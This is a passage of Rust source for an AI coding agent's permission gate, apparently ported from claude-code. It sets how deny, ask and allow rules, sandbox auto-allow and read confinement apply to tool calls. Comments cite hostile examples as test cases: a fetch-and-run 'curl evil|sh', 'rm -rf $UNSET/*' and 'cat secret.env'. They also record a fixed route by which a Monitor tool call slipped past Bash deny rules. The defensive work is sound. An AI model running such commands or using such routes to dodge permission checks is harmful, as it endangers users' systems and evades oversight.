    /// `toolMatchesRule` returns `false` when `ruleContent !== undefined`).
    ///
    /// Returns the raw rule tool-name strings (which may be a bare tool name like
    /// `"WebFetch"` OR an MCP server prefix like `"mcp__github"`); the caller
    /// matches each against an advertised tool's name with
    /// [`tool_wide_name_matches`]. Order follows source-bucket iteration; the
    /// caller only tests membership, so duplicates are harmless.
    #[must_use]
    pub fn tool_wide_deny_names(&self) -> Vec<String> {
        self.deny_rules
            .values()
            .flat_map(|rules| rules.iter())
            .filter(|r| r.value.rule_content.is_none())
            .map(|r| r.value.tool_name.clone())
            .collect()
    }

    /// The source of the highest-priority DENY rule that denies `Agent(<type>)`,
    /// or `None` if no such rule exists.
    ///
    /// 1:1 with claude-code `getDenyRuleForAgent` (`o5e(ctx, "Agent", type)`): a
    /// CONTENT deny rule whose `tool_name == "Agent"` and whose `rule_content`
    /// equals `agent_type` exactly. When several sources match, the one with the
    /// highest citation [`PermissionRuleSource::priority`] is returned (claude
    /// cites the first source in its walk). The deny rule keys on the `"Agent"`
    /// tool name even when the call arrives via the legacy `Task` alias.
    #[must_use]
    pub fn agent_type_deny_source(&self, agent_type: &str) -> Option<PermissionRuleSource> {
        self.deny_rules
            .values()
            .flat_map(|rules| rules.iter())
            .filter(|r| {
                (r.value.tool_name == "Agent" || r.value.tool_name == "Task")
                    && r.value.rule_content.as_deref() == Some(agent_type)
            })
            .map(|r| r.source)
            .max_by_key(|s| s.priority())
    }

    /// The set of agent-type names denied by a CONTENT-ful `Agent(<x>)` deny rule
    /// — the listing-filter set (claude-code `Pxe`). Order follows source-bucket
    /// iteration; callers test membership, so duplicates are harmless.
    #[must_use]
    pub fn agent_deny_content_types(&self) -> Vec<String> {
        self.deny_rules
            .values()
            .flat_map(|rules| rules.iter())
            .filter(|r| {
                (r.value.tool_name == "Agent" || r.value.tool_name == "Task")
                    && r.value.rule_content.is_some()
            })
            .filter_map(|r| r.value.rule_content.clone())
            .collect()
    }

    /// Resolve a tool call to a [`PermissionResult`].
    ///
    /// Evaluation order (claude-code `checkPermissionsForToolUse` skeleton):
    /// 1. Deny rules, walked from highest to lowest source priority.
    /// 2. Ask rules, same order (NEW — a matching ask rule forces a prompt).
    /// 3. Allow rules, same order.
    /// 4. Mode fallback (`Default`/`Plan`/`AcceptEdits` ask the user,
    ///    `BypassPermissions` allows unless the killswitch is set, `DontAsk`
    ///    denies).
    ///
    /// Rule matching ([`Self::rule_matches`]): TOOL-WIDE rules match by exact
    /// tool name (claude-code `toolMatchesRule`); CONTENT rules for FILE tools
    /// match the input's path via [`crate::filesystem`] grouping (phase 3a);
    /// CONTENT rules for SHELL tools (`Bash`/`PowerShell`) match the command
    /// per [`crate::shell_command`] — deny/ask match if ANY subcommand matches
    /// (aggressive wrapper/env stripping), allow requires EVERY subcommand
    /// covered (3a-bash). Other NON-file content rules stay tool-wide
    /// (`WebFetch` domain matching is a separate deferral). Shell + file content
    /// matching is active only when [`Self::roots`] is set (production always
    /// sets it); without roots the phase-2 tool-wide behavior is preserved.
    ///
    /// The wider `checkRead/checkWritePermissionForTool` allowances
    /// (working-directory auto-allow, `.git`/`.claude` safety asks, path/sed/
    /// mode constraints) are still NOT modeled — `Read`'s mode-ask is
    /// auto-allowed by `PolicyPermissionGate` (read-only default).
    #[must_use]
    pub fn authorize(&self, tool_name: &str, input: &serde_json::Value) -> PermissionResult {
        self.authorize_with_mode(tool_name, input, self.mode)
    }

    /// Like [`Self::authorize`], but evaluates the mode-driven layers (the
    /// `DontAsk` ask→deny transform, the `AcceptEdits` auto-allows, the `Plan`
    /// mutation backstop / bypass, and the generic mode fallback) against an
    /// EXPLICIT `mode` instead of the policy's boot [`Self::mode`].
    ///
    /// This is the seam the gate uses to apply a DYNAMIC mode — e.g. authorize
    /// under [`PermissionMode::Plan`] once the session has run `EnterPlanMode`.
    /// claude-code reads `toolPermissionContext.mode` live on every check; LingXi
    /// builds [`PermissionPolicy`] once at boot with a fixed mode and the gate
    /// holds it behind a shared `Arc` (so it can neither rebuild it nor call the
    /// `&mut` [`Self::set_mode`]). Threading the mode here lets the gate honor the
    /// live session mode without touching the rule buckets, roots, sandbox config,
    /// or working dirs — only the mode-driven layers see `mode`. `authorize` is
    /// exactly `authorize_with_mode(.., self.mode)`, so the rule-only behavior is
    /// unchanged.
    #[must_use]
    pub fn authorize_with_mode(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
        mode: PermissionMode,
    ) -> PermissionResult {
        self.authorize_with_mode_and_workspace_lease(tool_name, input, mode, None)
    }

    #[must_use]
    pub fn authorize_with_mode_and_workspace_lease(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
        mode: PermissionMode,
        workspace_lease_token: Option<u64>,
    ) -> PermissionResult {
        // SECURITY (Monitor→Bash): the oracle's Monitor `checkPermissions` is
        // `if(e.ws)return NU_(e.ws); return Lon({...e,command:e.command},t)` — a
        // COMMAND-monitor is evaluated by the FULL Bash resolver. Keyed by tool
        // name, the port's gate otherwise skips every Bash layer for "Monitor"
        // (deny rules `Bash(curl:*)`, the bash-safety AST, the `&` downgrade), so
        // `Monitor{command:"curl evil|sh"}` evaded them. Rewrite the effective
        // permission tool name to "Bash" for a command-monitor so all of that
        // machinery — deny/ask rule matching, safety, `&` — applies exactly as it
        // would to Bash. A `ws`-monitor (the `NU_` branch) is left untouched.
        let monitor_command = tool_name == "Monitor"
            && input.get("ws").is_none()
            && input
                .get("command")
                .and_then(serde_json::Value::as_str)
                .is_some();
        // .270 tBn checks the actual Monitor name before its tool-local
        // resolver delegates to Bash. Preserve that outer rule layer.
        if monitor_command {
            for content in [false, true] {
                if let Some(rule) = self.first_match(
                    &self.deny_rules,
                    &SOURCES_BY_PRIORITY,
                    "Monitor",
                    input,
                    content,
                ) {
                    return deny_with_rule(rule);
                }
            }
        }
        let monitor_ask = monitor_command
            .then(|| {
                self.first_match(
                    &self.ask_rules,
                    &SOURCES_BY_PRIORITY,
                    "Monitor",
                    input,
                    false,
                )
                .or_else(|| {
                    self.first_match(
                        &self.ask_rules,
                        &SOURCES_BY_PRIORITY,
                        "Monitor",
                        input,
                        true,
                    )
                })
            })
            .flatten();
        let tool_name = if monitor_command { "Bash" } else { tool_name };
        let result = self.authorize_inner(tool_name, input, mode, workspace_lease_token);
        // BGOP-01 — `&` background-operator allow→ask downgrade (claude-code
        // `Yqr`, the Bash checkPermissions wrapper). After the whole flow, an
        // ALLOW for a shell command containing `&` is downgraded to a forced ask
        // unless the AST parses cleanly with NO background `&` operator; the
        // sandbox-auto-allow grant is exempt. Bash-ast-gated (Yqr's `a7t` is the
        // tree-sitter parse, which is only available under the feature).
        #[cfg(feature = "bash-ast")]
        let result = self
            .background_operator_ask(tool_name, input, &result)
            .unwrap_or(result);
        let result = if monitor_command && !matches!(result, PermissionResult::Deny { .. }) {
            if let Some(rule) = monitor_ask {
                ask_with_rule(rule, "Monitor")
            } else if !monitor_ask_requires_confirmation(&result) {
                match self.first_match(
                    &self.allow_rules,
                    &SOURCES_BY_PRIORITY,
                    "Monitor",
                    input,
                    false,
                ) {
                    Some(rule) if self.rule_is_available_in_mode(rule, mode) => {
                        allow_with_rule(rule)
                    }
                    _ => result,
                }
            } else {
                result
            }
        } else {
            result
        };
        // PERM.1 — DontAsk transform (claude-code `permissions.ts:503-517`):
        // applied LAST so no early-return ask escapes it. A remaining `ask`
        // becomes `deny`, EXCEPT for read-only / `AllowByDefault` tools — in TS
        // their own `checkPermissions` returns `allow` BEFORE this transform, so
        // they are never over-denied. Here the surviving `ask` is left for the
        // gate's read-only default ([`crate::policy_gate`]) to auto-allow.
        if mode == PermissionMode::DontAsk
            && matches!(result, PermissionResult::Ask { .. })
            && !matches!(tool_default(tool_name), PromptDefault::AllowByDefault)
        {
            return deny_with_mode(PermissionMode::DontAsk);
        }
        // RESTRICTED-01: settings/git/tool-configuration writes require a
        // person or the configured permission handler. Apply this after the
        // ordinary rule/mode walk so explicit deny/ask decisions retain their
        // original provenance, but no allow-like path (including bypass mode,
        // an allow rule, or a tool-local auto allowance) can skip the prompt.
        if self.restricted
            && self.is_restricted_protected_mutation(tool_name, input)
            && matches!(result, PermissionResult::Allow { .. })
        {
            return ask_for_restricted_protected_mutation(tool_name, input);
        }
        // OUTSIDE-READS-01 (2.1.263 `sc`): `--restricted` and
        // `permissions.blockReadsOutsideWorkingDirectories` both confine the file
        // READ tools to the working directories, in EVERY permission mode — so
        // this runs after the mode walk, like RESTRICTED-01 above.
        if let Some(denial) = self.outside_working_dirs_denial(tool_name, input, &result) {
            return denial;
        }
        result
    }

    /// PARITY 2.1.263 `BK(path, input, forms, opts)` — the read-side filesystem
    /// ALLOWANCE walk, restricted to the carve-outs that survive under the read
    /// block. This is what `sc`'s `ruleCheck().behavior === "allow"` escape
    /// actually consults — **not** the permission allow-rule bucket.
    ///
    /// Under the block the oracle computes `k = remoteSurface || restricted ||
    /// blockOutsideReads`, and the `!k`-gated carve-outs (agent memory, tasks,
    /// teams) are therefore SUPPRESSED. What remains reachable here is the
    /// `readBlockFence && !restricted` group:
    ///
    /// ```js
    /// if (o?.readBlockFence && !o.restricted) {
    ///   if (d === Ne(be(),"CLAUDE.md")) return De(t,"The user memory file is allowed for reading");
    ///   for (let F of ["skills","plugins","rules","agents","commands"]) {
    ///     let V = Ne(be(),F)+Re;
    ///     if (d === V.slice(0,-1) || d.startsWith(V)) return De(t,`User ${F} files are allowed for reading`);
    ///   }
    /// }
    /// ```
    ///
    /// `be()` is the config home (`~/.lingxi` here). The group is gated on
    /// `!restricted`, so `--restricted` gets no fence carve-out.
    ///
    /// NOT yet ported (they need session-directory plumbing the `permission`
    /// crate cannot reach): the session-scoped allowances that also survive the
    /// block — plan files, tool-result files, scratchpad, job `tmp/`, project
    /// temp — and `Rzt()` bundled skill reference files. Their absence makes the
    /// block STRICTER than the oracle, never looser.
    fn read_block_allowance(&self, path: &Path, roots: &FsRoots) -> Option<String> {
        if !self.restricted && !self.block_reads_outside_working_directories {
            return None;
        }
        // Session-scoped carve-outs survive both `--restricted` and the
        // read block (oracle `XY`: plan / tool-results / scratchpad / job tmp
        // / project temp are not gated on `!restricted`).
        if let Some(plan_files) = self.plan_files.as_ref() {
            if plan_files.matches(path, Some(roots.cwd.as_path()), true) {
                return Some(crate::plan_files::PLAN_FILE_READ_ALLOW_REASON.to_string());
            }
        }
        for allowance in &self.session_read_allowances {
            if allowance.covers(path) {
                return Some(allowance.reason.clone());
            }
        }
        // `readBlockFence && !restricted`: config-home memory / skills / …
        if self.restricted || !self.block_reads_outside_working_directories {
            return None;
        }
        if path == roots.lingxi_home.join("CLAUDE.md") {
            return Some("The user memory file is allowed for reading".to_string());
        }
        for dir in ["skills", "plugins", "rules", "agents", "commands"] {
            let base = roots.lingxi_home.join(dir);
            if path == base || path.starts_with(&base) {
                return Some(format!("User {dir} files are allowed for reading"));
            }
        }
        None
    }

    /// PARITY 2.1.263 `Pmo` — under the read block, a command the shell parser
    /// CANNOT analyse escalates to the `zU` ask instead of the ordinary
    /// bash-safety ask, because an unanalysable command could read anywhere:
    ///
    /// ```js
    /// if (o.blockReadsOutsideWorkingDirectories === !0 && !(jS(e) && Nz())) return zU(p.reason);
    /// ```
    ///
    /// `jS(e) && Nz()` is the sandbox escape — a command that WOULD be
    /// sandbox-wrapped is exempt, since the sandbox fences its reads anyway.
    /// `jS(e)` is [`crate::sandbox_auto_allow::SandboxAutoAllowConfig::would_sandbox`];
    /// `Nz()` (`Wmt() && tVe()`) has no port-side equivalent, so the exemption is
    /// applied on `would_sandbox` alone. With no sandbox runtime wired (the
    /// default) nothing is exempt, which is the STRICTER direction.
    fn read_block_unanalyzable_ask(
        &self,
        tool_name: &str,
        command: &str,
        reason: &str,
    ) -> Option<PermissionResult> {
        if !self.block_reads_outside_working_directories {
            return None;
        }
        if self
            .sandbox_runtime
            .as_ref()
            .is_some_and(|sandbox| sandbox.would_sandbox(command))
        {
            return None;
        }
        Some(crate::read_block::ask_unanalyzable(tool_name, reason))
    }

    /// PARITY 2.1.263 `sc(e,t,r,o,d,p)` — the file-tool working-directory
    /// confinement. Two triggers share one function:
    ///
    /// ```js
    /// if (Bh(path, ctx, forms, workingDirs) || ruleCheck().behavior === "allow") return null;
    /// return {behavior:"deny",
    ///         message:`${path} is outside ${[...workingDirs].join(", ")}; ${why.why}`,
    ///         decisionReason:{type:"other", reason: why.reason}}
    /// ```
    ///
    /// called as `ctx.restricted ? ic : Ep` with
    /// `ctx.blockReadsOutsideWorkingDirectories ? mEt(ctx) : rb(ctx)`.
    ///
    /// 🚨 `ruleCheck()` is [`Self::read_block_allowance`] (`BK`), **not** the
    /// permission allow-rule bucket. In the oracle's read gate the order is
    /// `deny rules → sc → allow rules`, so an `sc` denial short-circuits before
    /// any allow rule is consulted: **an explicit `Read(<path>)` allow rule does
    /// NOT escape the block.** A `Deny` from the ordinary walk keeps its own
    /// provenance and is left alone.
    fn outside_working_dirs_denial(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
        result: &PermissionResult,
    ) -> Option<PermissionResult> {
        if !self.restricted && !self.block_reads_outside_working_directories {
            return None;
        }
        // The oracle gates this on the READ path (`checkReadPermissionForTool`);
        // the schema names Read/Grep/Glob/LSP, which is exactly `Reader`.
        if file_tool_kind(tool_name) != FileToolKind::Reader {
            return None;
        }
        // Deny rules already ran and win with their own reason.
        if matches!(result, PermissionResult::Deny { .. }) {
            return None;
        }
        let roots = self.roots.as_ref()?;
        let raw = input_path_for_tool(tool_name, input, roots)?;
        let path = crate::filesystem::expand_path(&raw, roots);
        // `ruleCheck().behavior === "allow"` — the filesystem allowance walk.
        if self.read_block_allowance(&path, roots).is_some() {
            return None;
        }
        let working_dirs = if self.block_reads_outside_working_directories {
            self.read_block_working_dirs(roots)
        } else {
            self.all_working_dirs(roots)
        };
        if crate::filesystem::path_in_allowed_working_path(&path, &working_dirs, roots) {
            return None;
        }
        // `${e} is outside ${[...p].join(", ")}; ${d.why}`
        let listed = working_dirs
            .iter()
            .map(|dir| dir.display().to_string())
            .collect::<Vec<_>>()
            .join(", ");
        let (why, reason) = if self.restricted {
            (RESTRICTED_OUTSIDE_WHY, RESTRICTED_OUTSIDE_REASON)
        } else {
            (READ_BLOCK_WHY, OUTSIDE_READS_BLOCKED_REASON)
        };
        Some(PermissionResult::Deny {
            reason: PermissionDecisionReason::Other {
                reason: reason.to_string(),
            },
            explanation: Some(format!("{} is outside {listed}; {why}", path.display())),
            metadata: PermissionMetadata::default(),
        })
    }

    /// Clone this policy, replacing only the live-mutable rule/working-dir
    /// state a host `updatedPermissions` payload can change mid-session.
    ///
    /// Used by the permission gate's in-memory live overlay so a session sees
    /// rule/directory updates immediately without mutating the shared boot
    /// policy structure.
    #[must_use]
    pub(crate) fn clone_with_live_state(
        &self,
        allow_rules: HashMap<PermissionRuleSource, Vec<PermissionRule>>,
        deny_rules: HashMap<PermissionRuleSource, Vec<PermissionRule>>,
        ask_rules: HashMap<PermissionRuleSource, Vec<PermissionRule>>,
        additional_working_dirs: AdditionalWorkingDirs,
    ) -> Self {
        Self {
            mode: self.mode,
            allow_rules,
            deny_rules,
            ask_rules,
            denial_tracking: Mutex::new(
                *self
                    .denial_tracking
                    .lock()
                    .unwrap_or_else(|e| e.into_inner()),
            ),
            bypass_killswitch_active: self.bypass_killswitch_active,
            restricted: self.restricted,
            auto_mode_disabled: self.auto_mode_disabled,
            bypass_permissions_available: self.bypass_permissions_available,
            roots: self.roots.clone(),
            stripped_dangerous: self.stripped_dangerous.clone(),
            stripped_positions: self.stripped_positions.clone(),
            additional_working_dirs,
            block_reads_outside_working_directories: self.block_reads_outside_working_directories,
            sandbox_runtime: self.sandbox_runtime.clone(),
            pwsh_parser: self.pwsh_parser.clone(),
            plan_files: self.plan_files.clone(),
            allow_managed_permission_rules_only: self.allow_managed_permission_rules_only,
            classify_all_shell: self.classify_all_shell,
            workspace_leases: self.workspace_leases.clone(),
            bash_command_clamps: self.bash_command_clamps.clone(),
            apply_auto_mode_restrictions: self.apply_auto_mode_restrictions,
            interactive_session: self.interactive_session,
            session_read_allowances: self.session_read_allowances.clone(),
        }
    }

    /// Rule + mode evaluation producing the pre-`DontAsk`-transform result.
    /// See [`Self::authorize_with_mode`] for the public contract and the
    /// evaluation order; that wrapper applies the `DontAsk` ask→deny transform.
    ///
    /// `mode` is the EFFECTIVE mode to evaluate against — the policy's boot
    /// [`Self::mode`] for [`Self::authorize`], or a caller-supplied mode (e.g.
    /// [`PermissionMode::Plan`] for the gate's live plan-mode path). Every
    /// mode-driven layer below reads this parameter, NOT `self.mode`, so the
    /// whole mode-fallback chain honors the effective mode.
    // This is the central precedence dispatcher; it grows by one short branch
    // per faithfully-ported claude-code gate layer (the 2c bash-safety branch
    // tipped it one line past the pedantic 100-line cap). Each layer is already
    // a thin call into a dedicated helper; further splitting the ordered walk
    // would obscure the 1:1 TS precedence it documents.
    #[allow(clippy::too_many_lines)]
    fn authorize_inner(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
        mode: PermissionMode,
        workspace_lease_token: Option<u64>,
    ) -> PermissionResult {
        let sources = SOURCES_BY_PRIORITY;

        // Precedence mirrors claude-code's real decision fn `mSm`
        // (offset ~205931956). The KEY invariant (R-D1): the ENTIRE deny phase
        // (tool-wide + content) runs before ANY ask, so a `deny` rule can never be
        // downgraded to an `ask`. The mSm order is:
        //   1a tool-wide deny  (`B3t` → `SIo`, ruleContent===void 0)
        //   1b content deny    (`K5t(...,"deny")`)
        //   1c tool-wide ask   (`EIo` → `SIo`, ruleContent===void 0)
        //   → e.checkPermissions(...) runs; ONLY a `deny` verdict short-circuits
        //     (`if(l?.behavior==="deny")return l`)
        //   1d content ask     (`K5t(...,"ask")`)  — mSm step 5
        //   → the checkPermissions ASK verdicts (dangerous rm/path/safety) are
        //     returned (mSm step 6), then its ALLOW verdicts (sandbox auto-allow,
        //     read-only, exact-allow) via the allow walk / mode.
        // Because LingXi's per-tool guards below (sandbox-auto-allow,
        // dangerous-removal, path-constraint, exact-allow, bash-safety) emit only
        // ALLOW or ASK verdicts (never `deny` — deny rules are the explicit walks
        // here), and content ask BEATS a checkPermissions allow/ask (mSm step 5
        // precedes step 6/7), content ask must sit BEFORE that guard block — i.e.
        // right after the deny phase + tool-wide ask. (Locked by
        // `read_only_ask_rule_still_asks` + `sandbox_auto_allow_ask_rule_still_asks`,
        // where a content ask wins over the read-only / sandbox auto-allow.)
        // 1a. Tool-wide deny.
        if let Some(rule) = self.first_match(&self.deny_rules, &sources, tool_name, input, false) {
            return deny_with_rule(rule);
        }
        // 1b. Content deny — runs as part of the deny phase, BEFORE any ask, so
        //     a `deny:[Bash(rm:*)]` is honored even when `ask:[Bash]` is also set
        //     (mSm: `K5t(...,"deny")` precedes the tool-wide ask `EIo`). This is
        //     the R-D1 fix: previously tool-wide ask walked before content deny,
        //     downgrading a deny to an ask.
        if let Some(rule) = self.first_match(&self.deny_rules, &sources, tool_name, input, true) {
            return deny_with_rule_content(rule, tool_name, input);
        }
        // 1c. Tool-wide ask (`EIo`). SBXASK-01 / SBX-ASKWIDE-03: the matched
        //     TOOL-WIDE ask rule is EXEMPTED for Bash when the sandbox auto-allow
        //     would apply — claude-code `Qot`/`U1g`:
        //       `y = e.name===$o && isSandboxingEnabled() &&
        //            isAutoAllowBashIfSandboxedEnabled() && C6(t);
        //        if(!y) return {behavior:"ask", ...}`.
        //     When exempt, the ask is skipped and control falls through so the
        //     1d sandbox auto-allow layer can decide. Content ask rules (1d) keep
        //     asking (matches `zOg`, whose internal re-check still asks on a
        //     matching ask rule). [`Self::shell_sandbox_auto_allows`] is the C6
        //     analogue (shell-tool + sandbox enabled + auto-allow + would-sandbox)
        //     and is inert (`false`) when no sandbox runtime is wired.
        if let Some(rule) = self.first_match(&self.ask_rules, &sources, tool_name, input, false) {
            if !self.shell_sandbox_auto_allows(tool_name, input) {
                return ask_with_rule(rule, tool_name);
            }
        }
        // 1c'. `bashCommandClamp` (NEW in 2.1.238). The clamp denials are the
        //     Bash / PowerShell / Monitor-websocket tools' OWN `checkPermissions`
        //     verdicts (`M8n` / `Wfm` / `Jkf`), so they sit at the
        //     `e.checkPermissions(...)` slot of the `mSm` walk: AFTER the
        //     tool-wide deny, content deny and tool-wide ask walks, and BEFORE
        //     the content-ask walk (mSm step 5) — `if(l?.behavior==="deny")
        //     return l` short-circuits there. A clamp therefore cannot be
        //     defeated by an ask rule, and an explicit deny rule still wins.
        //     INERT unless a `bash_command_clamp` layer was folded in for this
        //     call ([`Self::bash_command_clamps`] is empty otherwise).
        if let Some(denied) = self.bash_command_clamp_deny(tool_name, input) {
            return denied;
        }
        // 1d. Content ask (`K5t(...,"ask")`, mSm step 5) — a matching content ask
        //     rule prompts. Placed AFTER the deny phase but BEFORE the per-tool
        //     guards below, because content ask BEATS the guards' allow/ask
        //     verdicts (sandbox auto-allow, read-only allow, exact-allow). The
        //     gate's read-only default may still auto-allow, but the rule is
        //     honored.
        if let Some(rule) = self.first_match(&self.ask_rules, &sources, tool_name, input, true) {
            return ask_with_rule(rule, tool_name);
        }
        // 1e. POSSIBLY-EMPTY `$VAR` REMOVAL FORCED-ASK (claude-code 2.1.205 `GIu`,
        //     run inside the too-complex bash-checker branch `hHg`, bin
        //     @219788895). An `rm`/`rmdir` whose target is a possibly-empty
        //     variable path (`rm -rf $UNSET/*` → `rm -rf /*` when unset/empty)
        //     ALWAYS asks with a byte-locked SafetyCheck message
        //     (`classifier_approvable:false`) and CANNOT be auto-allowed by ANY
        //     rule. ORDER (1:1 with `hHg`, which runs `GIu` after the deny walks
        //     and BEFORE honoring any exact/prefix allow): this sits AFTER the
        //     deny + tool-wide/content ask walks and BEFORE the sandbox
        //     auto-allow (1d), the dangerous-removal / path guards (2/2b/2b'),
        //     the exact-match allow short-circuit (2c-exact), and the allow walk
        //     — so an exact `Bash(rm -rf $UNSET/*)` rule cannot bypass it.
        //     Gated on the AST `TooComplex` verdict (feature `bash-ast`) to
        //     mirror the too-complex branch: a parseable, resolvable-variable
        //     command (`A=/tmp; rm -rf $A/*`) is NOT force-asked here. Roots-
        //     independent, matching `GIu`'s raw text scan.
        // EDIT-READDENY-02: an Edit-family (Editor-kind) call whose target is
        //     covered by a Read deny rule (`CZn`) ASKS with the byte-locked
        //     errorCode-13 message. Runs after the deny/ask rule walks (an
        //     explicit Edit deny already returned) and is bypass-immune (CC's
        //     `validateInput` runs regardless of permission mode) — this
        //     protects a read-denied file from being edited, so it must not be
        //     overridable by an allow rule / bypass. Roots-gated.
        if file_tool_kind(tool_name) == FileToolKind::Editor
            && self.edit_covered_by_read_deny(tool_name, input)
        {
            return ask_edit_read_deny_covered(tool_name);
        }
        // PLAN-FILE-01 (2.1.266 `LZe` @351498 / the read resolver @352778): the
        //     session's own plan file is ALLOWED for reading and writing. Order
        //     is load-bearing — upstream places both allows after the edit
        //     deny/ask rule walks but BEFORE the write safety check and the
        //     plan-mode mutation ask, so the plan file stays writable even
        //     though LingXi's default plans directory
        //     (`<project-root>/.lingxi/plans`) sits under `.lingxi`, one of the
        //     protected components. Without this the plan-mode reminder tells
        //     the model to write a file the gate then prompts on every time.
        //     `includeWorkshopDoc` is `permissionMode === "plan"` for writes and
        //     always true for reads, exactly as the two call sites pass it.
        if let Some(plan_files) = self.plan_files.as_ref() {
            let kind = file_tool_kind(tool_name);
            let carve_out = match kind {
                FileToolKind::Editor => Some((true, mode == PermissionMode::Plan)),
                FileToolKind::Reader => Some((false, true)),
                FileToolKind::NonFile => None,
            };
            if let (Some((writing, include_workshop_doc)), Some(roots)) =
                (carve_out, self.roots.as_ref())
            {
                if let Some(path) = input_path_for_tool(tool_name, input, roots) {
                    if plan_files.matches(
                        std::path::Path::new(path.as_ref()),
                        Some(roots.cwd.as_path()),
                        include_workshop_doc,
                    ) {
                        return allow_plan_file(writing);
                    }
                }
            }
        }
        // Over-length bash input cannot be statically validated by the 10k-char
        // parser path, so it must force an Ask before any allow-like shortcut
        // (tool-wide/exact allow, sandbox auto-allow, read-only, mode auto-allow).
        if let Some(ask) = Self::shell_overlength_bash_ask(tool_name, input) {
            return ask;
        }
        #[cfg(feature = "bash-ast")]
        let bash_ast = if shell_command::is_shell_tool(tool_name) {
            shell_command::command_from_input(input)
                .map(crate::bash_ast_security::parse_for_security)
        } else {
            None
        };
        // BYPASS-01 / ALLOWOVER-01: every guard ASK below is routed through
        // `resolve_guard_ask`, which (1) lets bypassPermissions suppress a
        // type-`other` guard ask (returning allow), (2) lets a tool-wide allow
        // rule override a type-`other` guard ask (`nes`), and (3) preserves the
        // dangerous-removal SafetyCheck asks against BOTH. Guard DENYs pass
        // through unchanged.
        let bypass = self.bypass_active(mode);
        #[cfg(feature = "bash-ast")]
        if let Some(ask) =
            Self::shell_dangerous_rm_variable_ask(tool_name, input, bash_ast.as_ref())
        {
            return self.resolve_guard_ask(ask, bypass, mode, &sources, tool_name);
        }
        // 1f. CATASTROPHIC REMOVAL FORCED-ASK. This must run before every
        // allow-like shortcut, including sandbox auto-allow and exact allow:
        // removing `/`, `$HOME`, a root child, or the workspace is destructive
        // even if the command is hidden inside `$()`, backticks, or process
        // substitution.
        if let Some(roots) = self.roots.as_ref() {
            if shell_command::is_shell_tool(tool_name) {
                if let Some(command) = shell_command::command_from_input(input) {
                    let home = roots
                        .home
                        .as_deref()
                        .map(|p| p.to_string_lossy().into_owned());
                    if let Some(danger) = crate::dangerous_removal::check_dangerous_removal(
                        command,
                        &roots.cwd,
                        home.as_deref(),
                    ) {
                        return self.resolve_guard_ask(
                            ask_dangerous_removal(tool_name, danger),
                            bypass,
                            mode,
                            &sources,
                            tool_name,
                        );
                    }
                }
            }
        }
        // 1d. SANDBOX AUTO-ALLOW (claude-code `bashToolHasPermission`'s
        //     sandbox branch, `bashPermissions.ts:1829-1843` + `checkSandboxAutoAllow`).
        //     When sandboxing is enabled AND `autoAllowBashIfSandboxed` (default
        //     true) AND the command WOULD be sandboxed (`shouldUseSandbox`), a
        //     command that matched NO explicit deny/ask rule is auto-allowed —
        //     the sandbox is the safety boundary, not the prompt. ORDER: this
        //     runs AFTER the deny/ask walks (so explicit deny/ask rules still
        //     win — TS `checkSandboxAutoAllow` itself re-checks deny/ask on the
        //     full command + every subcommand before allowing; here those rules
        //     already short-circuited above) and AFTER the catastrophic removal
        //     guard above so a sandbox cannot auto-approve destructive deletes.
        //     Gated
        //     on [`Self::sandbox_runtime`]: `None` (the default) ⇒ no-op, so
        //     behavior is unchanged when absent.
        // PERM-SBX-WOG-02: on the too-complex/parse-abort branch this runs the
        // strict WOg gate instead of the permissive BAu check (BAu XOR WOg);
        // a normally-parsed command keeps the current BAu behavior.
        if self.shell_sandbox_auto_allows_decision(
            tool_name,
            input,
            #[cfg(feature = "bash-ast")]
            bash_ast.as_ref(),
        ) {
            return allow_sandbox_auto();
        }
        // 2. Path containment guards. The catastrophic removal guard used to
        //    live here; it now runs before sandbox auto-allow so substitutions
        //    and direct `rm` receive the same forced-ask protection.
        if let Some(roots) = self.roots.as_ref() {
            // PowerShell path containment (claude-code `validatePowerShellCommandPaths`
            // via a `pwsh` parse). Runs INSTEAD of the bash guards below — those
            // parse bash syntax and don't apply to cmdlets. Passthrough (falls
            // through to the normal flow) when no parser is wired / `pwsh` is
            // absent / the command doesn't parse — matching claude-code.
            if tool_name == "PowerShell" {
                if let Some(command) = shell_command::command_from_input(input) {
                    if let Some(result) = self.check_powershell_containment(command, roots, mode) {
                        return self.resolve_guard_ask(result, bypass, mode, &sources, tool_name);
                    }
                }
            } else if shell_command::is_shell_tool(tool_name) {
                if let Some(command) = shell_command::command_from_input(input) {
                    // 2b. Bash path-constraint guard (claude-code `checkPathConstraints`,
                    //     `BashTool/pathValidation.ts:1013`). A bash command that writes
                    //     (output redirection), `cd`s, or uses process substitution to
                    //     touch a path OUTSIDE the allowed working dirs (cwd +
                    //     `additional_working_dirs`) ALWAYS asks — even past a matching
                    //     allow rule, matching the TS `behavior: 'ask'` return. Shares the
                    //     dangerous-removal slot (after deny/ask walks, before the allow
                    //     walk, roots- + shell-gated). The `astCommands` branch is dropped
                    //     in favor of the `split_command` path (documented in
                    //     `path_constraints`).
                    // 2b-deny. Output-redirect target vs `Edit(...)` DENY rule
                    //     (claude-code `EUr`→`Ptt`, the `create`-op deny walk that
                    //     runs BEFORE the containment ask). A redirect whose
                    //     resolved target matches an Edit-deny rule is DENIED (not
                    //     asked), e.g. `echo x > denied.txt` under `deny:[Edit(denied.txt)]`.
                    //     (The read-op command-path deny walk — `cat secret.env` vs
                    //     `Read(secret.env)` — needs the PATH_EXTRACTORS op split and
                    //     is a documented follow-up.)
                    if let Some(deny) = self.output_redirect_deny(&sources, command, roots) {
                        return deny;
                    }
                    if let Some(deny) = self.input_redirect_deny(&sources, command, roots) {
                        return deny;
                    }
                    // 2b-deny(read/cmd). PATH-01: a COMMAND-PATH target matching a
                    //     Read-deny (read op) / Edit-deny (write/create op) CONTENT
                    //     rule is DENIED (claude-code `EUr`→`Ptt` returns a
                    //     rule-typed deny that `yPg` surfaces as `behavior:"deny"`)
                    //     — e.g. `cat secret.env` under `deny:["Read(secret.env)"]`
                    //     even inside cwd. Runs before the containment ask (deny
                    //     beats ask) and is bypass-immune (a deny short-circuits
                    //     before the mode layer in CC).
                    if let Some(deny) = self.command_path_deny(&sources, command, roots) {
                        return deny;
                    }
                    // Under the read block the cd target is validated against
                    // `mEt` (project-settings dirs excluded) — see `ppo`.
                    let read_block_dirs = self
                        .block_reads_outside_working_directories
                        .then(|| self.read_block_working_dirs(roots));
                    if let Some(ask) = crate::path_constraints::check_path_constraints(
                        command,
                        roots,
                        &self.additional_working_dirs.paths(),
